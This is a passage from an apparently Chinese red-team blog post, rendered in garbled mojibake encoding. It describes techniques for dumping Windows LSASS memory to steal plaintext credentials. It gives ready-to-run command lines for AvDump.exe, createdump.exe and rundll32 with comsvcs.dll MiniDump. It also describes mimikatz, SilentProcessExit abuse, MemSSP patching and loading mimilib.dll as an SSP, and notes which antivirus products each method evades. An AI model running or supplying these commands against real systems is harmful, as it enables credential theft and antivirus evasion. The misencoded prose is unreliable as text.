<!DOCTYPE html>
<html id="bg">

<head>
    <meta charset="utf-8" />
<!--
    * @Theme Card
    * @Author admin@itjoker.cn
    * @Link https://blog.itjoker.cn
-->

<title>
    ğŸ³æ¯…ç§å¾ªç¯
</title>
<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
<meta name="author" content="ğŸ³æ¯…ç§å¾ªç¯">
<meta name="description" content="</br>è¥¿éƒŠæœ‰å¯†æ—ï¼ŒåŠ©å›å‡ºé‡å›´ã€‚</br>
</br># WhoAmI</br>
</br># æ¯…ç§å¾ªç¯</br>">
<meta name="keywords" content="æ¯…ç§å¾ªç¯,Redteam,æ¸—é€æµ‹è¯•">
<meta name="gridea-theme" content="Card">
<meta name="spider" content="https://nmsl.sbjxw.ç½‘å€">
<meta name="UpdateTime" content="1653964744272">
<script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io/CDN/js/jquery@3.4.1.min.js"></script>
<link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
<script src="https://fastly.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io/CDN/js/Card/prism.min.js"></script>
<link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.36/CDN/css/Card/prism.min.css" />
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0-beta/dist/katex.min.css">
<script src="https://fastly.jsdelivr.net/npm/katex@0.10.0-beta/dist/katex.min.js"></script>
<script src="https://fastly.jsdelivr.net/npm/katex@0.10.0-beta/dist/contrib/auto-render.min.js"></script>
<script src="https://fastly.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
<!--<script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.36/CDN/js/Card/script.min.js"></script>
<link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.36/CDN/css/Card/main.min.css" />-->
<script src="https://redteamblog.icu/media/js/script.min.js"></script>
<link rel="stylesheet" href="https://redteamblog.icu/media/css/main.min.css" />
<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css" />
<link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.36/CDN/css/Card/iconfont.css" />
<!--link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_410989_wuhl0k5ojvf.css" /-->
<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.36/CDN/js/love.min.js"></script>
<script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
<script>
    $().ready(
        function() {
            if (window.localStorage.getItem('first_visit') != 1) {
                window.localStorage.setItem('theme', window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
                window.localStorage.setItem('first_visit', 1);
            }
            var themeIcon = document.getElementById("themeIcon");
            var currentTheme = window.localStorage.getItem('theme');
            if (currentTheme == 'dark') {
                imgList = document.getElementsByTagName('img');
                for (let i = 0; i < imgList.length; i++) {
                    imgList[i].style.cssText = mediaCssText;
                }
                document.documentElement.style.cssText = cssText;
                document.getElementsByClassName('card-bg')[0].style.cssText = mediaCssText;
                themeIcon.classList.remove('Card-moon');
                themeIcon.classList.add('Card-sun');
            } else {
                imgList = document.getElementsByTagName('img');
                for (let i = 0; i < imgList.length; i++) {
                    imgList[i].style.cssText = '';
                }
                document.documentElement.style.cssText = '';
                document.getElementsByClassName('card-bg')[0].style.cssText = '';
                document.getElementsByTagName('html')[0].setAttribute('id', 'bg');
                themeIcon.classList.remove('Card-sun');
                themeIcon.classList.add('Card-moon');
            }
        }
    )
</script>

    <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io/CDN/js/hit-kounter-lc-0.3.0.js"></script>
    
        
            <script>
                (function() {
                    var bp = document.createElement('script');
                    var curProtocol = window.location.protocol.split(':')[0];
                    if (curProtocol === 'https') {
                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                    } else {
                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                    }
                    var s = document.getElementsByTagName("script")[0];
                    s.parentNode.insertBefore(bp, s);
                })();
            </script>
            
                <script async src="https://www.googletagmanager.com/gtag/js?id=UA-226932280-1"></script>
                <script>
                    window.dataLayer = window.dataLayer || [];

                    function gtag() {
                        dataLayer.push(arguments);
                    }
                    gtag('js', new Date());
                    gtag('config', 'UA-226932280-1');
                </script>
                
                    <style>
                        .Card-certify {
                            color: #0091e4 !important;
                        }
                        
                        #foot {
                            color: #666666;
                        }
                        
                        #menu-item:hover {
                            border-bottom: 1px solid rgba(0, 0, 0, 0.5);
                            border-bottom-color: rgba(0, 0, 0, .6);
                        }
                        
                        .gray {
                            -webkit-filter: grayscale(100%);
                            /* webkit */
                            -moz-filter: grayscale(100%);
                            /*firefox*/
                            -ms-filter: grayscale(100%);
                            /*ie9*/
                            -o-filter: grayscale(100%);
                            /*opera*/
                            filter: grayscale(100%);
                            filter: progid: DXImageTransform.Microsoft.BasicImage(grayscale=1);
                            filter: gray;
                            /*ie9- */
                        }
                        
                        .lite-item,
                        #header {
                            opacity: 1;
                        }
                        
                        .lite-item {
                            background-color: #fafafa;
                        }
                        
                        #btnStyle:hover {
                            transition: all .3s ease;
                            /*color: #fff;*/
                            /*background-color: #6b6b6b;*/
                            background-color: #eaeaea;
                            /*#0092ee*/
                            /*linear-gradient( rgb(138, 160, 255) 30%, rgb(90, 140, 250) 70%);*/
                        }
                        
                        #btnStyle {
                            /*background-color: #efefef;*/
                            font-size: 14px;
                            transition: all .3s ease;
                        }
                        
                        .link_a:hover {
                            margin-top: 10px;
                            margin-bottom: 10px;
                            color: #fff;
                            border-left: 8px solid #6b6b6b;
                            padding: 5px;
                            transition: all .3s ease;
                        }
                        
                        html {
                            width: 100%;
                            height: 100%;
                            background-attachment: fixed;
                            background-repeat: no-repeat;
                        }
                    </style>
</head>

<body>
    <header id="header">

    <div id="pc-menu">
        <a id="menu-bar" class="Card Card-menu"></a>
        <a id="menu-title" href="https://redteamblog.icu">
            ğŸ³æ¯…ç§å¾ªç¯
        </a>
        <nav id="menu-main" class="menu-main">
            <ul>
                <li id="menu-item" class="menu-item">
                    <div id="tp-weather-widget"></div>
                </li>
                
                    <li id="menu-item" class="menu-item">
                        <a href="/">
                            ğŸ˜€é¦–é¡µ
                        </a>
                    </li>
                    
                    <li id="menu-item" class="menu-item">
                        <a href="/posts">
                            æ–‡ç« åˆ—è¡¨
                        </a>
                    </li>
                    
                    <li id="menu-item" class="menu-item">
                        <a href="/archives">
                            ğŸ¤¿å½’æ¡£
                        </a>
                    </li>
                    
                    <li id="menu-item" class="menu-item">
                        <a href="/tags">
                            ğŸ„â€â™€ï¸æ ‡ç­¾
                        </a>
                    </li>
                    
                    <li id="menu-item" class="menu-item">
                        <a href="/post/about">
                            ğŸ‘¹å…³äº
                        </a>
                    </li>
                    
            </ul>
        </nav>
        <form id="gridea-search-form" class="searchform" data-update="1653964744272" action="/search/index.html">
            <i class="Card Card-search"></i>
            <input id="s" class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
        </form>
    </div>
    <div id="mobile-menu">
        <form id="gridea-search-form" class="mobile-searchform" data-update="1653964744272" action="/search/index.html">
            <i class="Card Card-search"></i>
            <input id="s" class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
        </form>
        <nav class="menu">
            <ul style="list-style: none;">
                
                    <li class="page_item page-item-2">
                        <a href="/">
                            ğŸ˜€é¦–é¡µ
                        </a>
                    </li>
                    
                    <li class="page_item page-item-2">
                        <a href="/posts">
                            æ–‡ç« åˆ—è¡¨
                        </a>
                    </li>
                    
                    <li class="page_item page-item-2">
                        <a href="/archives">
                            ğŸ¤¿å½’æ¡£
                        </a>
                    </li>
                    
                    <li class="page_item page-item-2">
                        <a href="/tags">
                            ğŸ„â€â™€ï¸æ ‡ç­¾
                        </a>
                    </li>
                    
                    <li class="page_item page-item-2">
                        <a href="/post/about">
                            ğŸ‘¹å…³äº
                        </a>
                    </li>
                    
            </ul>
        </nav>
    </div>
    <a id="theme-btn" class="theme-btn" onclick="App.changeTheme()"><i id="themeIcon" class="Card Card-moon"></i></a>
</header>
        <div id="main">
            <div id="main-part">
                <div class="lite-item">
                    <article class="post post-type real-post">
                        <header class="post-type-header">
                            
                                <div class="thumbnail-link" style="background-image: url('https://api.ixiaowai.cn/api/api.php?=1')"></div>
                                
                                        <div class="thumbnail-shadow">
                                            <h1 class="post-title">
                                                ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•
                                            </h1>
                                            <div class="post-info">
                                                <span class="post-category"><i class="Card Card-novel"></i>
                                        
                                            <span onclick="javascript:top.location='https://redteamblog.icu/tag/-uEIOBB-D/'">æ¸—é€æµ‹è¯•</span>
                                                
                                                    </span>
                                                    <span class="post-view">
                                                    
                                                        &nbsp;â€¢&nbsp;
                                                    <span id="/post/41016eb03b2343a69a9be35f251f1e9c/" class="leancloud_visitors" data-flag-title="ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•">
                                                <i class="Card Card-view"></i>&nbsp;é˜…è¯»é‡&nbsp;
                                                <i class="leancloud-visitors-count">0</i>
                                            </span>

                                                    
                                                            </span>&nbsp;â€¢&nbsp;

                                                            <span class="post-readtime">é˜…è¯»æ—¶é—´:
                                            13.6åˆ†</span>
                                                            <span class="post-edit"></span></div>
                                        </div>
                                        <div class="post-relative">
                                            <img alt="ğŸ³æ¯…ç§å¾ªç¯" src="https://redteamblog.icu/images/avatar.png?v=1653964744272" srcset="https://redteamblog.icu/images/avatar.png?v=1653964744272" class="avatar avatar-100 photo" width="100" height="100">
                                            <span class="post-type-author"><a href="https://redteamblog.icu" title="ç”±ğŸ³æ¯…ç§å¾ªç¯å‘å¸ƒ" rel="author">ğŸ³æ¯…ç§å¾ªç¯<i class="Card Card-certify"></i></a></span>
                                            <span class="post-publish"><i class="fa fa-calendar" aria-hidden="true"></i>&nbsp;2022-04-29</span>
                                        </div>
                        </header>
                        <div class="post-main post-type-main">
                            <div class="post-content">
                                <div class="post-content-real">
                                    <h1 id="ä¸€äº›è·å–windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•">ä¸€äº›è·å–Windowsæ˜æ–‡å‡­æ®çš„æ–¹æ³•</h1>
<ul>
<li><a href="https://loong716.top/posts/lsass/#0x00-%E6%96%B9%E6%B3%95">0x00 æ–¹æ³•</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-mimikatz%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96lsass">1. Mimikatzç›´æ¥è¯»å–Lsass</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dump">2. ç­¾å/ç™½åå•æ–‡ä»¶Dump</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-avdumpexe">(1) AvDump.exe</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-createdumpexe">(2) CreateDump.exe</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-rundll32exe">(3) Rundll32.exe</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#3-%E5%88%A9%E7%94%A8silentprocessexit%E8%BF%9B%E8%A1%8Cdump">3. åˆ©ç”¨SilentProcessExitè¿›è¡ŒDump</a></li>
<li><a href="https://loong716.top/posts/lsass/#4-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84ssp">4. æ·»åŠ è‡ªå®šä¹‰çš„SSP</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E4%BD%BF%E7%94%A8memssp%E5%AF%B9lsass%E8%BF%9B%E8%A1%8Cpatch">(1) ä½¿ç”¨MemSSPå¯¹lsassè¿›è¡Œpatch</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E4%BD%BF%E7%94%A8addsecuritypackage%E5%8A%A0%E8%BD%BDssp">(2) ä½¿ç”¨AddSecurityPackageåŠ è½½SSP</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-%E9%80%9A%E8%BF%87rpc%E5%8A%A0%E8%BD%BDssp">(3) é€šè¿‡RPCåŠ è½½SSP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x01-%E5%AE%9E%E7%8E%B0">0x01 å®ç°</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%96%E5%86%99dump-lsass%E7%9A%84dll">1. ç¼–å†™Dump Lsassçš„DLL</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E5%B0%86dll%E4%B8%8Eexe%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85">2. å°†DLLä¸EXEæ–‡ä»¶æ‰“åŒ…</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-%E5%B0%86%E8%BF%9B%E7%A8%8Bdump%E5%88%B0%E5%86%85%E5%AD%98">3. å°†è¿›ç¨‹dumpåˆ°å†…å­˜</a></li>
<li><a href="https://loong716.top/posts/lsass/#4-x86%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8rpc%E5%8A%A0%E8%BD%BDssp">4. x86ç¯å¢ƒä¸‹åˆ©ç”¨RPCåŠ è½½SSP</a></li>
<li><a href="https://loong716.top/posts/lsass/#5-%E5%85%B6%E5%AE%83%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E7%9A%84%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF">5. å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x02-%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98">0x02 å¯èƒ½é‡åˆ°çš„é—®é¢˜</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%BA%E5%B0%91vc%E8%BF%90%E8%A1%8C%E5%BA%93">1. ç¼ºå°‘VCè¿è¡Œåº“</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-dump%E6%96%87%E4%BB%B6%E4%BD%93%E7%A7%AF%E8%BF%87%E5%A4%A7">2. dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x03-%E6%80%BB%E7%BB%93">0x03 æ€»ç»“</a></li>
</ul>
<p>è·å–Windowsç”¨æˆ·çš„å‡­è¯ä¿¡æ¯æ˜¯æ¸—é€è¿‡ç¨‹ä¸­è‡³å…³é‡è¦çš„ä¸€æ­¥ï¼Œä¸æ€è½¯çš„å¯¹æŠ—ä¹Ÿåœ¨ä¸æ–­å‡çº§</p>
<p>æœ¬æ–‡å¯¹å¸¸è§çš„Dump Lsass/è·å–æ˜æ–‡å‡­æ®çš„æ–¹æ³•è¿›è¡Œç®€å•çš„æ€»ç»“ï¼Œä»¥åº”å¯¹å®æˆ˜ä¸­å„ç§å„æ ·çš„åœºæ™¯</p>
<h2 id="0x00-æ–¹æ³•">0x00 æ–¹æ³•</h2>
<h3 id="1-mimikatzç›´æ¥è¯»å–lsass">1. Mimikatzç›´æ¥è¯»å–Lsass</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ–¹ä¾¿å¿«æ·</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>mimikatzå¿…é¡»å…æ€</li>
<li>æ— æ³•ç»•è¿‡éƒ¨åˆ†AVå¯¹lsassçš„ç›‘æ§</li>
</ul>
</blockquote>
<p>ç»å…¸å§¿åŠ¿ï¼Œä½¿ç”¨mimikatzçš„<code>sekurlsa::logonpasswords</code></p>
<p>å…¶å®æ˜¯è°ƒç”¨<code>ReadProcessMemory</code>æ¥å°†lsassè¿›ç¨‹è¯»å…¥å†…å­˜ä¸­çš„å¦ä¸€ä¸ªåœ°å€ä¸­ï¼Œç„¶åå¯¹è¿›ç¨‹è¿›è¡Œè§£æï¼š</p>
<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" alt="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" loading="lazy"></figure>
<h3 id="2-ç­¾åç™½åå•æ–‡ä»¶dump">2. ç­¾å/ç™½åå•æ–‡ä»¶Dump</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç¨‹åºæ‹¥æœ‰åˆæ³•ç­¾å</li>
<li>è¿œç¨‹Dumpåä¸‹è½½åˆ°æœ¬åœ°ç¦»çº¿è§£æï¼Œå‡å°‘ç‰¹å¾</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>è™½ç„¶æœ‰ç­¾åä½†éƒ¨åˆ†AVä»ä¼šå‘å‡ºè­¦å‘Š</li>
<li>æ— æ³•ç»•è¿‡éƒ¨åˆ†AVå¯¹lsassçš„ç›‘æ§</li>
<li>dumpå¾—åˆ°çš„å†…å­˜è½¬å‚¨æ–‡ä»¶å¯èƒ½è§¦å‘æŠ¥è­¦</li>
</ul>
</blockquote>
<p>ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªç¨‹åºï¼š</p>
<ol>
<li>Procdump.exe</li>
<li>SqlDumper.exe</li>
<li>AvDump.exe</li>
<li>createdump.exe</li>
<li>rundll32.exe</li>
</ol>
<p>å…¶ä¸­1ã€2ã€4è¿™ä¸‰ä¸ªå·¥å…·æ˜¯æœ‰å¾®è½¯ç­¾åçš„ï¼Œ3æ˜¯æœ‰æ€è½¯å‚å•†Avastçš„ç­¾åï¼Œrundll32è¿™ä¸ªLOLBINå°±ä¸ç”¨è¯´äº†</p>
<p>å‰ä¸¤ä¸ªå·¥å…·çš„ç”¨æ³•å·²ç»æ˜¯è€ç”Ÿå¸¸è°ˆäº†ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ–‡ç« ï¼Œä¸»è¦è®¨è®ºåä¸‰ä¸ª</p>
<p>**PSï¼š**æ³¨æ„ä½¿ç”¨è¿™äº›å·¥å…·çš„æ—¶å€™æœ€å¥½æ˜¯systemæƒé™ï¼Œå¦‚æœæ˜¯administratorçš„è¯è¦æ³¨æ„æ˜¯å¦æœ‰<code>SeDebugPrivilege</code>ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å¯ä»¥åœ¨å‘½ä»¤å‰ä½¿ç”¨<code>powershell -c</code></p>
<h3 id="1-avdumpexe">(1) AvDump.exe</h3>
<p>AvDump.exeæ˜¯æ€è½¯Avastè‡ªå¸¦çš„ä¸€ä¸ªç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä»¥ç”¨æ¥dumpè¿›ç¨‹çš„å†…å­˜ï¼Œæ‹¥æœ‰Avastçš„ç­¾å</p>
<pre><code>.\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" alt="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" loading="lazy"></figure>
<h3 id="2-createdumpexe">(2) CreateDump.exe</h3>
<blockquote>
<p>createdump.exeéšç€.NET5å‡ºç°çš„ï¼Œæœ¬èº«æ˜¯ä¸ªnative binary</p>
</blockquote>
<p>è™½ç„¶createdump.exeæ˜¯éšç€.NET5å‡ºç°çš„ï¼Œä½†å› ä¸ºå®ƒæ˜¯native binaryï¼Œæ‰€ä»¥æ‰§è¡Œæ—¶å¹¶ä¸éœ€è¦ä¾èµ–.NET5çš„ç¯å¢ƒ</p>
<pre><code>createdump.exe -u -f lsass.dmp &lt;lsass pid&gt;

</code></pre>
<h3 id="3-rundll32exe">(3) Rundll32.exe</h3>
<p>å…¶å®å°±æ˜¯ä½¿ç”¨rundll32ç›´æ¥æ‰§è¡Œcomsvcs.dllçš„å¯¼å‡ºå‡½æ•°<code>MiniDump</code>æ¥Dumpè¿›ç¨‹å†…å­˜</p>
<pre><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\admin\Desktop\lsass-comsvcs.dmp full

</code></pre>
<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" alt="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" loading="lazy"></figure>
<h3 id="3-åˆ©ç”¨silentprocessexitè¿›è¡Œdump">3. åˆ©ç”¨SilentProcessExitè¿›è¡ŒDump</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ç³»ç»Ÿæ­£å¸¸è¡Œä¸º</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦å†™æ³¨å†Œè¡¨</li>
</ul>
</blockquote>
<p>å¾ˆä¹…ä¹‹å‰çœ‹åˆ°è¿‡è®©ç³»ç»Ÿè“å±ï¼Œç„¶åé€šè¿‡windbgè°ƒè¯•ç³»ç»Ÿå´©æºƒæ–‡ä»¶æ¥è¯»å–lsassè¿›ç¨‹ï¼Œä½†ä¸ªäººæ„Ÿè§‰è¿™ç§æ–¹æ³•é£é™©è¿‡å¤§ï¼Œå¹¶ä¸”äº§ç”Ÿçš„å´©æºƒæ–‡ä»¶çš„ä½“ç§¯éå¸¸å¤§ï¼Œåœ¨å®æˆ˜ä¸­çš„åº”ç”¨æƒ…å†µæœ‰é™</p>
<p>ç›´åˆ°ä¸ä¹…å‰çœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« ä½¿ç”¨SilentProcessExitæ¥ä½¿lsassé™é»˜é€€å‡ºï¼Œè¿›è€Œdumpè¿›ç¨‹å†…å­˜çš„æ–¹æ³•ï¼Œå…·ä½“åŸç†å¯ä»¥çœ‹æ–‡ç« ï¼š</p>
<p><a href="https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w">åˆ©ç”¨SilentProcessExitæœºåˆ¶dumpå†…å­˜</a></p>
<blockquote>
<p>Silent Process Exitï¼Œå³é™é»˜é€€å‡ºã€‚è€Œè¿™ç§è°ƒè¯•æŠ€æœ¯ï¼Œå¯ä»¥æ´¾ç”Ÿ werfault.exeè¿›ç¨‹ï¼Œå¯ä»¥ç”¨æ¥è¿è¡Œä»»æ„ç¨‹åºæˆ–è€…ä¹Ÿå¯ä»¥ç”¨æ¥è½¬å­˜ä»»æ„è¿›ç¨‹çš„å†…å­˜æ–‡ä»¶æˆ–å¼¹å‡ºçª—å£ã€‚</p>
</blockquote>
<p>å®é™…æµ‹è¯•ä¸­ï¼Œè¯¥æ–¹æ³•ç¡®å®å¯ä»¥dump lsassçš„è¿›ç¨‹å†…å­˜</p>
<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" alt="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" loading="lazy"></figure>
<p>ä½†åœ¨å¡å·´æ–¯åŸºç¯å¢ƒä¸‹ï¼Œä¸ä¼šæŠ¥è­¦ä½†dumpæ–‡ä»¶ä¸º0kb(çŒœæµ‹æ˜¯å¡å·´æ‹’ç»ç³»ç»Ÿè¡Œä¸ºè½¬å‚¨lsassè¿›ç¨‹)</p>
<p>è€Œé‡åˆ°defender+360çš„æƒ…å†µä¸‹ï¼ŒåŒæ ·ä¸ä¼šè§¦å‘æŠ¥è­¦ï¼Œä½†è¯¥ç¨‹åºæ— æ³•ä¿®æ”¹æ³¨å†Œè¡¨é¡¹</p>
<h3 id="4-æ·»åŠ è‡ªå®šä¹‰çš„ssp">4. æ·»åŠ è‡ªå®šä¹‰çš„SSP</h3>
<h3 id="1-ä½¿ç”¨memsspå¯¹lsassè¿›è¡Œpatch">(1) ä½¿ç”¨MemSSPå¯¹lsassè¿›è¡Œpatch</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ä¸éœ€è¦é‡å¯æœåŠ¡å™¨</li>
<li>Lsassè¿›ç¨‹ä¸­ä¸ä¼šå‡ºç°å¯ç–‘çš„DLL</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦è°ƒç”¨WriteProcessMemoryå¯¹lsassè¿›è¡Œæ“ä½œï¼Œå¯èƒ½ä¼šè¢«æ ‡è®°</li>
</ul>
</blockquote>
<p>è¯¥æ–¹æ³•çš„å¤§æ¦‚åŸç†æ˜¯ï¼Œé€šè¿‡æ‰“å¼€lsassè¿›ç¨‹çš„å¥æŸ„ï¼Œç„¶åæœç´¢<code>msv1_0.dll</code>ï¼ˆæ”¯æŒäº¤äº’å¼èº«ä»½éªŒè¯çš„DLLï¼‰ï¼Œæ‰¾åˆ°ä¹‹åå¯¹å…¶ä¸­çš„<code>SpAcceptCredentials</code>å‡½æ•°è¿›è¡Œhookï¼Œå½“ç”¨æˆ·è¿›è¡Œè®¤è¯æ—¶åœ¨<code>SpAcceptCredentials</code>å‡½æ•°ç¬¬ä¸€è¡Œä¼šé¦–å…ˆ<code>jmp</code>åˆ°æˆ‘ä»¬çš„å‡½æ•°ï¼Œå°†å‡­è¯å†™å…¥æ–‡ä»¶åå†è·³å›åŸå‡½æ•°</p>
<p>å½“æˆ‘ä»¬æ‰§è¡Œåï¼Œå°è¯•ç”¨æˆ·èº«ä»½è®¤è¯ï¼Œå¯ä»¥çœ‹åˆ°å¯†ç è¢«è®°å½•åœ¨mimilsa.txtä¸­ï¼š</p>
<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" alt="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" loading="lazy"></figure>
<p>lsassçš„è¿›ç¨‹ä¸­å¹¶ä¸å­˜åœ¨å¼‚å¸¸çš„DLLï¼š</p>
<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" alt="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" loading="lazy"></figure>
<h3 id="2-ä½¿ç”¨addsecuritypackageåŠ è½½ssp">(2) ä½¿ç”¨AddSecurityPackageåŠ è½½SSP</h3>
<blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å¯ä»¥ç»•è¿‡éƒ¨åˆ†æ€è½¯å¯¹lsassçš„ç›‘æ§</li>
<li>å¯ä»¥åŠ è½½mimilibæ¥è®°å½•å¯†ç ä»¥åº”å¯¹ç‰ˆæœ¬å¤§äºç­‰äºWindows Server 2012çš„æƒ…å†µ</li>
<li>ä¸éœ€è¦é‡å¯æœåŠ¡å™¨</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦å†™æ³¨å†Œè¡¨</li>
<li>éœ€è¦å°†SSPçš„dllæ‹·è´åˆ°system32ä¸‹ï¼ˆè¿™ä¸ªè¯´ç¼ºç‚¹ä¼¼ä¹ä¹Ÿè°ˆä¸ä¸Šï¼‰</li>
<li>Blue Teamå¯ä»¥é€šè¿‡æšä¸¾SSPæ¥å‘ç°æˆ‘ä»¬è‡ªå®šä¹‰çš„SSPï¼Œå¹¶ä¸”lsassè¿›ç¨‹ä¸­å¯ä»¥çœ‹åˆ°åŠ è½½çš„DLL</li>
</ul>
</blockquote>
<p>SSPå’ŒSSPIçš„çŸ¥è¯†å°±ä¸è°ˆäº†ï¼Œæ·»åŠ SSPéœ€è¦ä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>å°†mimilib.dllå¤åˆ¶åˆ°<code>c:\windows\system32</code>ä¸‹</li>
<li>å°†<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code>å¤„Security Packagesçš„å€¼è®¾ç½®ä¸ºmimilib.dll</li>
<li>è°ƒç”¨<code>AddSecurityPackage</code>æ·»åŠ SSP</li>
</ol>
<p>ç›¸å…³ä»£ç å¯ä»¥å‚è€ƒï¼š<a href="https://github.com/lengjibo/RedTeamTools/blob/master/windows/CredSSP/CredSSP/CredSSP.cpp">CredSSP</a></p>
<p>è¿™é‡Œç›´æ¥ä½¿ç”¨**@lengyi**å¸ˆå‚…çš„ä»£ç ï¼Œè¿è¡Œåä¼šå°†å­˜æ”¾åœ¨èµ„æºåŒºçš„mimilib.dllé‡Šæ”¾åˆ°å½“å‰ç›®å½•ï¼Œç„¶åç§»åŠ¨åˆ°system32ä¸‹ï¼Œä¿®æ”¹æ³¨å†Œè¡¨ï¼Œæœ€ç»ˆè°ƒç”¨<code>AddSecurityPackage</code>æ·»åŠ sspï¼š</p>
<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" alt="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" loading="lazy"></figure>
<p>å¯ä»¥çœ‹åˆ°lsassè¿›ç¨‹åŠ è½½äº†mimilib.dllï¼š</p>
